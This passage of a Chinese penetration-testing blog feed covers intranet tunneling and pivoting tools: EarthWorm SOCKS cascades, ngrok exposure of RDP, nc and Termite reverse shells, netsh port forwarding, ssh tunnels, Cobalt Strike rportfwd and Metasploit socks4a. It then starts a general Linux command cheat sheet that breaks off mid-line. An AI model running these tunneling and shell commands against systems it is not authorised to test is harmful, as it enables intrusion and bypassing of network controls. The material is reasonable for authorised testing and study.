SOCKS v5。首先提供两个“二级级联”本地SOCKS测试样例：</p><p>a) <code>lcx_tran</code> 的用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ ./ew -s ssocksd  -l 9999  <br>$ ./ew -s lcx_tran -l 1080 -f 127.0.0.1 -g 9999  <br></code></pre></td></tr></table></figure><p>b) <code>lcx_listen</code>、<code>lcx_slave</code> 的用法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ ./ew -s lcx_listen -l 1080 -e 8888  <br>$ ./ew -s ssocksd    -l 9999  <br>$ ./ew -s lcx_slave  -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999  <br></code></pre></td></tr></table></figure><p>再提供一个“三级级联”的本地SOCKS测试用例以供参考</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">$ ./ew -s rcsocks -l 1080 -e 8888   <br>$ ./ew -s lcx_slave -d 127.0.0.1 -e 8888 -f 127.0.0.1 -g 9999    <br>$ ./ew -s lcx_listen -l 9999 -e 7777    <br>$ ./ew -s rssocks -d 127.0.0.1 -e 7777  <br></code></pre></td></tr></table></figure><p>数据流向: <code>SOCKS v5 -&gt; 1080 -&gt; 8888 -&gt; 9999 -&gt; 7777 -&gt; rssocks</code></p><h1>ngrok</h1><h2 id="简介-4">简介</h2><blockquote><p>ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试。</p></blockquote><h2 id="特点-2">特点</h2><ol><li>官方维护，一般较为稳定</li><li>跨平台，闭源</li><li>有流量记录和重发功能</li></ol><h2 id="使用方法-3">使用方法</h2><ol><li>进入ngrok官网（<a href="https://ngrok.com/%EF%BC%89%EF%BC%8C%E6%B3%A8%E5%86%8Cngrok%E8%B4%A6%E5%8F%B7%E5%B9%B6%E4%B8%8B%E8%BD%BDngrok%EF%BC%9B">https://ngrok.com/），注册ngrok账号并下载ngrok；</a></li><li>根据官网给定的授权码，运行如下授权命令；</li><li><code>./ngrok authtoken 1hAotxhmORtzCYvUc3BsxDBPh1H_******************</code></li><li><code>./ngrok http 80</code>即可将机器的80端口http服务暴露到公网，并且会提供一个公网域名。</li></ol><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230217141749867.png" alt="image-20230217141749867"></p><p>可以通过官网的UI界面查看数据包和流量等等（但是要付费==、）</p><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20230217141806145.png" alt="image-20230217141806145"></p><p>还可以通过一些命令将内网的文件和其他TCP服务 暴露到公网中。</p><p>有授权的设置文件共享</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ngrok http -auth=&quot;user:password&quot; file:///Users/alan/share  <br></code></pre></td></tr></table></figure><p>无授权的设置文件共享</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ngrok http &quot;file:///C:\\Users\\alan\\Public Folder&quot;  <br></code></pre></td></tr></table></figure><p>将主机的3389的TCP端口暴露到公网</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ngrok tcp 3389  <br></code></pre></td></tr></table></figure><h1>nc</h1><p>nc是netcat的简写，有着网络界的瑞士军刀美誉。因为它短小精悍、功能实用，被设计为一个简单、可靠的网络工具。可以用来反弹shell、传输文件、端口扫描等。写这边博客主要是记录这个工具的用法，以免后面忘记。</p><p>靶机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nc -l -p 23333<br></code></pre></td></tr></table></figure><p>攻击机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">nc IP 23333<br></code></pre></td></tr></table></figure><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20221024162612440.png" alt="image-20221024162612440"></p><h3 id="termite">termite</h3><p>Termite是一款内网穿透利器，分为管理端admin和代理端agent。它支持多平台、跳板机间正反向级联、内置shell管理等</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">添加代理：socks 1080<br>反弹一个shell：shell 7777<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-| 指定本地socks端口,等待远程连<br>-C 指定远程socks机器ip<br>-p 指定远程socks机器端口<br></code></pre></td></tr></table></figure><h1>netsh</h1><p>windows自带规则配置工具</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">添加一条规则：将远程的3389端口转发到本地的7777端口上<br><br>netsh interface portproxy add v4tov4 listenport=7777 connect=3389 connectaddress=192.168.93.10 protocol=tcp<br><br>查看转发规则：netsh interface portproxy dump<br><br>删除转发规则：netsh interface portproxy delete v4tov4 listenport=7777<br></code></pre></td></tr></table></figure><p><img src="/2023/02/17/%E5%87%A0%E6%AC%BE%E5%AE%9E%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7/image-20221025194526456.png" alt="image-20221025194526456"></p><h1>ssh</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#!bash<br><br>ssh -qTfnN -L port:host:hostport -l user remote_ip   #正向隧道，监听本地port<br><br>ssh -qTfnN -R port:host:hostport -l user remote_ip   #反向隧道，用于内网穿透防火墙限制之类<br><br>SSH -qTfnN -D port remotehost   #直接进行socks代理<br><br>参数详解：<br><br>-q Quiet mode. 安静模式<br><br>-T Disable pseudo-tty allocation. 不占用 shell 了<br><br>-f Requests ssh to go to background just before command execution. 后台运行，并推荐加上 -n 参数<br><br>-N Do not execute a remote command. 不执行远程命令，端口转发就用它了～<br><br>#!bash<br>ssh -CfNg -L port1:127.0.0.1:port2 user@host    #本地转发<br>ssh -CfNg -R port2:127.0.0.1:port1 user@host    #远程转发<br></code></pre></td></tr></table></figure><h1>cobaltstrike</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cs生成一个客户端，将其拿到目标机器是上运行，拿到一个会话<br><br>然后进入交互模式<br><br>rportfwd 8888 rhost 3389<br><br>rportfwd stop 8888<br></code></pre></td></tr></table></figure><h1>Metasploit socks4a</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">1.添加路由：run post/multi/manage/autoroute<br>2.查看路由：run autoroute -p<br>3.添加socks代理：use auxiliary/server/socks4a<br>4.使用代理链工具调用代理：proxychains rdesktop 192.168.93.10### EW<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透常用命令</title>
      <link href="/2023/02/15/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/02/15/%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="系统信息">系统信息</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">arch      #显示机器的处理器架构(1)<br>uname -m  #显示机器的处理器架构(2)<br>uname -r  #显示正在使用的内核版本<br>dmidecode -q          #显示硬件系统部件 - (SMBIOS / DMI)<br>hdparm -i /dev/hda    #罗列一个磁盘的架构特性<br>hdparm -tT /dev/sda   #在磁盘上执行测试性读取操作<br>cat /proc/cpuinfo     #显示CPU info的信息<br>cat /proc/interrupts  #显示中断<br>cat /proc/meminfo     #校验内存使用<br>cat /proc/swaps       #显示哪些swap被使用<br>cat /proc/version     #显示内核的版本<br>cat /proc/net/dev     #显示网络适配器及统计<br>cat /proc/mounts      #显示已加载的文件系统<br>lspci -tv   #罗列PCI设备<br>lsusb -tv   #显示USB设备<br></code></pre></td></tr></table></figure><h2 id="date-显示系统日期">date 显示系统日期</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cal 2007              #显示2007年的日历表<br>date 041217002007.00   #设置日期和时间 - 月日时分年.秒<br>clock -w              #将时间修改保存到 BIOS<br></code></pre></td></tr></table></figure><h2 id="关机-系统的关机、重启以及登出">关机 (系统的关机、重启以及登出 )</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shutdown -h now    #关闭系统(1)<br>init 0            #关闭系统(2)<br>telinit 0         #关闭系统(3)<br>shutdown -h hours:minutes &amp;   #按预定时间关闭系统<br>shutdown -c       #取消按预定时间关闭系统<br>shutdown -r now   #重启(1)<br>reboot   #重启(2)<br>logout   #注销<br></code></pre></td></tr></table></figure><h2 id="文件和目录">文件和目录</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cd /home    #进入 &#x27;/ home&#x27; 目录&#x27;<br>cd ..       #返回上一级目录<br>cd ../..    #返回上两级目录<br>cd          #进入个人的主目录<br>cd ~user1   #进入个人的主目录<br>cd -       #返回上次所在的目录<br>pwd        #显示工作路径<br><br>ls      #查看目录中的文件<br>ls -F   #查看目录中的文件<br>ls -l   #显示文件和目录的详细资料<br>ls -a   #显示隐藏文件<br>ls *[0-9]*   #显示包含数字的文件名和目录名<br>tree         #显示文件和目录由根目录开始的树形结构(1)<br>lstree       #显示文件和目录由根目录开始的树形结构(2)<br><br>mkdir dir1         #创建一个叫做 &#x27;dir1&#x27; 的目录&#x27;<br>mkdir dir1 dir2    #同时创建两个目录<br>mkdir -p /tmp/dir1/dir2   #创建一个目录树<br>rm -f file1    #删除一个叫做 &#x27;file1&#x27; 的文件&#x27;<br>rmdir dir1     #删除一个叫做 &#x27;dir1&#x27; 的目录&#x27;<br>rm -rf dir1    #删除一个叫做 &#x27;dir1&#x27; 的目录并同时删除其内容<br>rm -rf dir1 dir2    #同时删除两个目录及它们的内容<br>mv dir1 new_dir     #重命名/移动 一个目录<br><br>cp file1 file2     #复制一个文件<br>cp dir/* .         #复制一个目录下的所有文件到当前工作目录<br>cp -a /tmp/dir1 .   #复制一个目录到当前工作目录<br>cp -a dir1 dir2     #复制一个目录<br><br>ln -s file1 lnk1  #创建一个指向文件或目录的软链接<br>ln file1 lnk1     #创建一个指向文件或目录的物理链接<br><br>touch -t 0712250000 file1   #修改一个文件或目录的时间戳 - (YYMMDDhhmm)<br>file file1 outputs the mime type of the file as text<br>iconv -l   #列出已知的编码<br><br>iconv -f fromEncoding -t toEncoding inputFile &gt; outputFile creates a new from the given input file by assuming it is encoded in fromEncoding and converting it to toEncoding.<br><br>find . -maxdepth 1 -name *.jpg -print -exec convert &quot;&#123;&#125;&quot; -resize 80x60 &quot;thumbs/&#123;&#125;&quot; \; batch resize files in the current directory and send them to a thumbnails directory (requires convert from Imagemagick)<br></code></pre></td></tr></table></figure><h2 id="文件搜索">文件搜索</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">find / -name file1     #从 &#x27;/&#x27; 开始进入根文件系统搜索文件和目录<br>find / -user user1     #搜索属于用户 &#x27;user1&#x27; 的文件和目录<br>find /home/user1 -name \*.bin        #在目录 &#x27;/ home/user1&#x27; 中搜索带有&#x27;.bin&#x27; 结尾的文件<br>find /usr/bin -type f -atime +100    #搜索在过去100天内未被使用过的执行文件<br>find /usr/bin -type f -mtime -10     #搜索在10天内被创建或者修改过的文件<br>find / -name \*.rpm -exec chmod 755 &#x27;&#123;&#125;&#x27; \;      #搜索以 &#x27;.rpm&#x27; 结尾的文件并定义其权限<br>find / -xdev -name \*.rpm        #搜索以 &#x27;.rpm&#x27; 结尾的文件，忽略光驱、捷盘等可移动设备<br>locate \*.ps       #寻找以 &#x27;.ps&#x27; 结尾的文件 - 先运行 &#x27;updatedb&#x27; 命令<br>whereis halt       #显示一个二进制文件、源码或man的位置<br>which halt         #显示一个二进制文件或可执行文件的完整路径<br></code></pre></td></tr></table></figure><h2 id="挂载一个文件系统">挂载一个文件系统</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mount /dev/hda2 /mnt/hda2    #挂载一个叫做hda2的盘 - 确定目录 &#x27;/ mnt/hda2&#x27; 已经存在<br>umount /dev/hda2            #卸载一个叫做hda2的盘 - 先从挂载点 &#x27;/ mnt/hda2&#x27; 退出<br>fuser -km /mnt/hda2         #当设备繁忙时强制卸载<br>umount -n /mnt/hda2         #运行卸载操作而不写入 /etc/mtab 文件- 当文件为只读或当磁盘写满时非常有用<br>mount /dev/fd0 /mnt/floppy        #挂载一个软盘<br>mount /dev/cdrom /mnt/cdrom       #挂载一个cdrom或dvdrom<br>mount /dev/hdc /mnt/cdrecorder    #挂载一个cdrw或dvdrom<br>mount /dev/hdb /mnt/cdrecorder    #挂载一个cdrw或dvdrom<br>mount -o loop file.iso /mnt/cdrom    #挂载一个文件或ISO镜像文件<br>mount -t vfat /dev/hda5 /mnt/hda5    #挂载一个Windows FAT32文件系统<br>mount /dev/sda1 /mnt/usbdisk         #挂载一个usb 捷盘或闪存设备<br>mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share      #挂载一个windows网络共享<br></code></pre></td></tr></table></figure><h2 id="磁盘空间">磁盘空间</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">df -h           #显示已经挂载的分区列表<br>ls -lSr |more    #以尺寸大小排列文件和目录<br>du -sh dir1      #估算目录 &#x27;dir1&#x27; 已经使用的磁盘空间&#x27;<br>du -sk * | sort -rn     #以容量大小为依据依次显示文件和目录的大小<br>rpm -q -a --qf &#x27;%10&#123;SIZE&#125;t%&#123;NAME&#125;n&#x27; | sort -k1,1n <br>#以大小为依据依次显示已安装的rpm包所使用的空间 (fedora, redhat类系统)<br>dpkg-query -W -f=&#x27;$&#123;Installed-Size;10&#125;t$&#123;Package&#125;n&#x27; | sort -k1,1n <br>#以大小为依据显示已安装的deb包所使用的空间 (ubuntu, debian类系统)<br></code></pre></td></tr></table></figure><h2 id="用户和群组">用户和群组</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">groupadd group_name   #创建一个新用户组<br>groupdel group_name   #删除一个用户组<br>groupmod -n new_group_name old_group_name   #重命名一个用户组<br>useradd -c &quot;Name Surname &quot; -g admin -d /home/user1 -s /bin/bash user1     #创建一个属于 &quot;admin&quot; 用户组的用户<br>useradd user1      #创建一个新用户<br>userdel -r user1   #删除一个用户 ( &#x27;-r&#x27; 排除主目录)<br>usermod -c &quot;User FTP&quot; -g system -d /ftp/user1 -s /bin/nologin user1   #修改用户属性<br><br>passwd         #修改口令<br>passwd user1   #修改一个用户的口令 (只允许root执行)<br>chage -E 2005-12-31 user1    #设置用户口令的失效期限<br>pwck     #检查 &#x27;/etc/passwd&#x27; 的文件格式和语法修正以及存在的用户<br>grpck    #检查 &#x27;/etc/passwd&#x27; 的文件格式和语法修正以及存在的群组<br>newgrp group_name     #登陆进一个新的群组以改变新创建文件的预设群组<br></code></pre></td></tr></table></figure><h2 id="文件的权限">文件的权限</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">使用 &quot;+&quot; 设置权限，使用 &quot;-&quot; 用于取消<br><br>ls -lh    #显示权限<br>ls /tmp | pr -T5 -W$COLUMNS   #将终端划分成5栏显示<br>chmod ugo+rwx directory1      #设置目录的所有人(u)、群组(g)以及其他人(o)以读（r ）、写(w)和执行(x)的权限<br>chmod go-rwx directory1      #删除群组(g)与其他人(o)对目录的读写执行权限<br>chown user1 file1            #改变一个文件的所有人属性<br>chown -R user1 directory1    #改变一个目录的所有人属性并同时改变改目录下所有文件的属性<br>chgrp group1 file1          #改变文件的群组<br>chown user1:group1 file1     #改变一个文件的所有人和群组属性<br>find / -perm -u+s           #罗列一个系统中所有使用了SUID控制的文件<br>chmod u+s /bin/file1        #设置一个二进制文件的 SUID 位 - 运行该文件的用户也被赋予和所有者同样的权限<br>chmod u-s /bin/file1        #禁用一个二进制文件的 SUID位<br>chmod g+s /home/public      #设置一个目录的SGID 位 - 类似SUID ，不过这是针对目录的<br>chmod g-s /home/public      #禁用一个目录的 SGID 位<br>chmod o+t /home/public      #设置一个文件的 STIKY 位 - 只允许合法所有人删除文件<br>chmod o-t /home/public      #禁用一个目录的 STIKY 位<br></code></pre></td></tr></table></figure><h2 id="文件的特殊属性">文件的特殊属性</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">- 使用 &quot;+&quot; 设置权限，使用 &quot;-&quot; 用于取消<br><br>chattr +a file1   #只允许以追加方式读写文件<br>chattr +c file1   #允许这个文件能被内核自动压缩/解压<br>chattr +d file1   #在进行文件系统备份时，dump程序将忽略这个文件<br>chattr +i file1   #设置成不可变的文件，不能被删除、修改、重命名或者链接<br>chattr +s file1   #允许一个文件被安全地删除<br>chattr +S file1   #一旦应用程序对这个文件执行了写操作，使系统立刻把修改的结果写到磁盘<br>chattr +u file1   #若文件被删除，系统会允许你在以后恢复这个被删除的文件<br>lsattr           #显示特殊的属性<br></code></pre></td></tr></table></figure><h2 id="打包和压缩文件">打包和压缩文件</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bunzip2 file1.bz2   #解压一个叫做 &#x27;file1.bz2&#x27;的文件<br>bzip2 file1         #压缩一个叫做 &#x27;file1&#x27; 的文件<br>gunzip file1.gz     #解压一个叫做 &#x27;file1.gz&#x27;的文件<br>gzip file1          #压缩一个叫做 &#x27;file1&#x27;的文件<br>gzip -9 file1       #最大程度压缩<br><br>rar a file1.rar test_file          #创建一个叫做 &#x27;file1.rar&#x27; 的包<br>rar a file1.rar file1 file2 dir1   #同时压缩 &#x27;file1&#x27;, &#x27;file2&#x27; 以及目录 &#x27;dir1&#x27;<br>rar x file1.rar     #解压rar包<br>unrar x file1.rar   #解压rar包<br><br>tar -cvf archive.tar file1   #创建一个非压缩的 tarball<br>tar -cvf archive.tar file1 file2 dir1  #创建一个包含了 &#x27;file1&#x27;, &#x27;file2&#x27; 以及 &#x27;dir1&#x27;的档案文件<br>tar -tf archive.tar    #显示一个包中的内容<br>tar -xvf archive.tar   #释放一个包<br>tar -xvf archive.tar -C /tmp     #将压缩包释放到 /tmp目录下<br>tar -cvfj archive.tar.bz2 dir1   #创建一个bzip2格式的压缩包<br>tar -jxvf archive.tar.bz2        #解压一个bzip2格式的压缩包<br>tar -cvfz archive.tar.gz dir1    #创建一个gzip格式的压缩包<br>tar -zxvf archive.tar.gz         #解压一个gzip格式的压缩包<br><br>zip file1.zip file1    #创建一个zip格式的压缩包<br>zip -r file1.zip file1 file2 dir1    #将几个文件和目录同时压缩成一个zip格式的压缩包<br>unzip file1.zip    #解压一个zip格式压缩包<br></code></pre></td></tr></table></figure><h2 id="RPM-包-（Fedora-Redhat及类似系统）">RPM 包 - （Fedora, Redhat及类似系统）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">rpm -ivh package.rpm    #安装一个rpm包<br>rpm -ivh --nodeeps package.rpm   #安装一个rpm包而忽略依赖关系警告<br>rpm -U package.rpm        #更新一个rpm包但不改变其配置文件<br>rpm -F package.rpm        #更新一个确定已经安装的rpm包<br>rpm -e package_name.rpm   #删除一个rpm包<br>rpm -qa      #显示系统中所有已经安装的rpm包<br>rpm -qa | grep httpd    #显示所有名称中包含 &quot;httpd&quot; 字样的rpm包<br>rpm -qi package_name    #获取一个已安装包的特殊信息<br>rpm -qg &quot;System Environment/Daemons&quot;     #显示一个组件的rpm包<br>rpm -ql package_name       #显示一个已经安装的rpm包提供的文件列表<br>rpm -qc package_name       #显示一个已经安装的rpm包提供的配置文件列表<br>rpm -q package_name --whatrequires     #显示与一个rpm包存在依赖关系的列表<br>rpm -q package_name --whatprovides    #显示一个rpm包所占的体积<br>rpm -q package_name --scripts         #显示在安装/删除期间所执行的脚本l<br>rpm -q package_name --changelog       #显示一个rpm包的修改历史<br>rpm -qf /etc/httpd/conf/httpd.conf    #确认所给的文件由哪个rpm包所提供<br>rpm -qp package.rpm -l    #显示由一个尚未安装的rpm包提供的文件列表<br>rpm --import /media/cdrom/RPM-GPG-KEY    #导入公钥数字证书<br>rpm --checksig package.rpm      #确认一个rpm包的完整性<br>rpm -qa gpg-pubkey      #确认已安装的所有rpm包的完整性<br>rpm -V package_name     #检查文件尺寸、 许可、类型、所有者、群组、MD5检查以及最后修改时间<br>rpm -Va                 #检查系统中所有已安装的rpm包- 小心使用<br>rpm -Vp package.rpm     #确认一个rpm包还未安装<br>rpm2cpio package.rpm | cpio --extract --make-directories *bin*   #从一个rpm包运行可执行文件<br>rpm -ivh /usr/src/redhat/RPMS/`arch`/package.rpm    #从一个rpm源码安装一个构建好的包<br>rpmbuild --rebuild package_name.src.rpm       #从一个rpm源码构建一个 rpm 包<br></code></pre></td></tr></table></figure><h2 id="YUM-软件包升级器-（Fedora-RedHat及类似系统）">YUM 软件包升级器 - （Fedora, RedHat及类似系统）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">yum install package_name             #下载并安装一个rpm包<br>yum localinstall package_name.rpm    #将安装一个rpm包，使用你自己的软件仓库为你解决所有依赖关系<br>yum update package_name.rpm    #更新当前系统中所有安装的rpm包<br>yum update package_name        #更新一个rpm包<br>yum remove package_name        #删除一个rpm包<br>yum list                   #列出当前系统中安装的所有包<br>yum search package_name     #在rpm仓库中搜寻软件包<br>yum clean packages          #清理rpm缓存删除下载的包<br>yum clean headers           #删除所有头文件<br>yum clean all                #删除所有缓存的包和头文件<br></code></pre></td></tr></table></figure><h2 id="DEB-包-Debian-Ubuntu-以及类似系统">DEB 包 (Debian, Ubuntu 以及类似系统)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">dpkg -i package.deb     #安装/更新一个 deb 包<br>dpkg -r package_name    #从系统删除一个 deb 包<br>dpkg -l                 #显示系统中所有已经安装的 deb 包<br>dpkg -l | grep httpd    #显示所有名称中包含 &quot;httpd&quot; 字样的deb包<br>dpkg -s package_name    #获得已经安装在系统中一个特殊包的信息<br>dpkg -L package_name    #显示系统中已经安装的一个deb包所提供的文件列表<br>dpkg --contents package.deb    #显示尚未安装的一个包所提供的文件列表<br>dpkg -S /bin/ping              #确认所给的文件由哪个deb包提供<br></code></pre></td></tr></table></figure><h2 id="APT-软件工具-Debian-Ubuntu-以及类似系统">APT 软件工具 (Debian, Ubuntu 以及类似系统)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">apt-get install package_name      #安装/更新一个 deb 包<br>apt-cdrom install package_name    #从光盘安装/更新一个 deb 包<br>apt-get update      #升级列表中的软件包<br>apt-get upgrade     #升级所有已安装的软件<br>apt-get remove package_name     #从系统删除一个deb包<br>apt-get check     #确认依赖的软件仓库正确<br>apt-get clean     #从下载的软件包中清理缓存<br>apt-cache search searched-package    #返回包含所要搜索字符串的软件包名称<br></code></pre></td></tr></table></figure><h2 id="查看文件内容">查看文件内容</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat file1      #从第一个字节开始正向查看文件的内容<br>tac file1      #从最后一行开始反向查看一个文件的内容<br>more file1     #查看一个长文件的内容<br>less file1     #类似于 &#x27;more&#x27; 命令，但是它允许在文件中和正向操作一样的反向操作<br>head -2 file1    #查看一个文件的前两行<br>tail -2 file1    #查看一个文件的最后两行<br>tail -f /var/log/messages     #实时查看被添加到一个文件中的内容<br></code></pre></td></tr></table></figure><h2 id="文本处理">文本处理</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">cat file1 file2 ... | command &lt;&gt; file1_in.txt_or_file1_out.txt general syntax for text manipulation using PIPE, STDIN and STDOUT<br><br>cat file1 | command( sed, grep, awk, grep, etc...) &gt; result.txt <br>#合并一个文件的详细说明文本，并将简介写入一个新文件中<br>cat file1 | command( sed, grep, awk, grep, etc...) &gt;&gt; result.txt <br>#合并一个文件的详细说明文本，并将简介写入一个已有的文件中<br><br>grep Aug /var/log/messages     #在文件 &#x27;/var/log/messages&#x27;中查找关键词&quot;Aug&quot;<br>grep ^Aug /var/log/messages    #在文件 &#x27;/var/log/messages&#x27;中查找以&quot;Aug&quot;开始的词汇<br>grep [0-9] /var/log/messages   #选择 &#x27;/var/log/messages&#x27; 文件中所有包含数字的行<br>grep Aug -R /var/log/*         #在目录 &#x27;/var/log&#x27; 及随后的目录中搜索字符串&quot;Aug&quot;<br><br>sed &#x27;s/stringa1/stringa2/g&#x27; example.txt <br>#将example.txt文件中的 &quot;string1&quot; 替换成 &quot;string2&quot;<br>sed &#x27;/^$/d&#x27; example.txt           #从example.txt文件中删除所有空白行<br>sed &#x27;/ *#/d; /^$/d&#x27; example.txt   #从example.txt文件中删除所有注释和空白行<br>echo &#x27;esempio&#x27; | tr &#x27;[:lower:]&#x27; &#x27;[:upper:]&#x27;    #合并上下单元格内容<br>sed -e &#x27;1d&#x27; result.txt          #从文件example.txt 中排除第一行<br>sed -n &#x27;/stringa1/p&#x27;            #查看只包含词汇 &quot;string1&quot;的行<br>sed -e &#x27;s/ *$//&#x27; example.txt    #删除每一行最后的空白字符<br>sed -e &#x27;s/stringa1//g&#x27; example.txt  <br>#从文档中只删除词汇 &quot;string1&quot; 并保留剩余全部<br>sed -n &#x27;1,5p;5q&#x27; example.txt     #查看从第一行到第5行内容<br>sed -n &#x27;5p;5q&#x27; example.txt       #查看第5行<br>sed -e &#x27;s/00*/0/g&#x27; example.txt   #用单个零替换多个零<br><br>cat -n file1       #标示文件的行数<br>cat example.txt | awk &#x27;NR%2==1&#x27;      #删除example.txt文件中的所有偶数行<br>echo a b c | awk &#x27;&#123;print $1&#125;&#x27;        #查看一行第一栏<br>echo a b c | awk &#x27;&#123;print $1,$3&#125;&#x27;     #查看一行的第一和第三栏<br>paste file1 file2           #合并两个文件或两栏的内容<br>paste -d &#x27;+&#x27; file1 file2    #合并两个文件或两栏的内容，中间用&quot;+&quot;区分<br><br>sort file1 file2              #排序两个文件的内容<br>sort file1 file2 | uniq       #取出两个文件的并集(重复的行只保留一份)<br>sort file1 file2 | uniq -u    #删除交集，留下其他的行<br>sort file1 file2 | uniq -d    #取出两个文件的交集(只留下同时存在于两个文件中的文件)<br><br>comm -1 file1 file2    #比较两个文件的内容只删除 &#x27;file1&#x27; 所包含的内容<br>comm -2 file1 file2    #比较两个文件的内容只删除 &#x27;file2&#x27; 所包含的内容<br>comm -3 file1 file2    #比较两个文件的内容只删除两个文件共有的部分<br></code></pre></td></tr></table></figure><h2 id="字符设置和文件格式转换">字符设置和文件格式转换</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">dos2unix filedos.txt fileunix.txt      #将一个文本文件的格式从MSDOS转换成UNIX<br>unix2dos fileunix.txt filedos.txt      #将一个文本文件的格式从UNIX转换成MSDOS<br>recode ..HTML &lt; page.txt &gt; page.html   #将一个文本文件转换成html<br>recode -l | more                       #显示所有允许的转换格式<br></code></pre></td></tr></table></figure><h2 id="文件系统分析">文件系统分析</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">badblocks -v /dev/hda1    #检查磁盘hda1上的坏磁块<br>fsck /dev/hda1            #修复/检查hda1磁盘上linux文件系统的完整性<br>fsck.ext2 /dev/hda1       #修复/检查hda1磁盘上ext2文件系统的完整性<br>e2fsck /dev/hda1          #修复/检查hda1磁盘上ext2文件系统的完整性<br>e2fsck -j /dev/hda1       #修复/检查hda1磁盘上ext3文件系统的完整性<br>fsck.ext3 /dev/hda1       #修复/检查hda1磁盘上ext3文件系统的完整性<br>fsck.vfat /dev/hda1       #修复/检查hda1磁盘上fat文件系统的完整性<br>fsck.msdos /dev/hda1      #修复/检查hda1磁盘上dos文件系统的完整性<br>dosfsck /dev/hda1         #修复/检查hda1磁盘上dos文件系统的完整性<br></code></pre></td></tr></table></figure><h2 id="初始化一个文件系统">初始化一个文件系统</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mkfs /dev/hda1        #在hda1分区创建一个文件系统<br>mke2fs /dev/hda1      #在hda1分区创建一个linux ext2的文件系统<br>mke2fs -j /dev/hda1   #在hda1分区创建一个linux ext3(日志型)的文件系统<br>mkfs -t vfat 32 -F /dev/hda1   #创建一个 FAT32 文件系统<br>fdformat -n /dev/fd0           #格式化一个软盘<br>mkswap /dev/hda3               #创建一个swap文件系统<br></code></pre></td></tr></table></figure><h2 id="SWAP文件系统">SWAP文件系统</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">mkswap /dev/hda3             #创建一个swap文件系统<br>swapon /dev/hda3             #启用一个新的swap文件系统<br>swapon /dev/hda2 /dev/hdb3   #启用两个swap分区<br></code></pre></td></tr></table></figure><h2 id="备份">备份</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">dump -0aj -f /tmp/home0.bak /home    #制作一个 &#x27;/home&#x27; 目录的完整备份<br>dump -1aj -f /tmp/home0.bak /home    #制作一个 &#x27;/home&#x27; 目录的交互式备份<br>restore -if /tmp/home0.bak          #还原一个交互式备份<br><br>rsync -rogpav --delete /home /tmp    #同步两边的目录<br>rsync 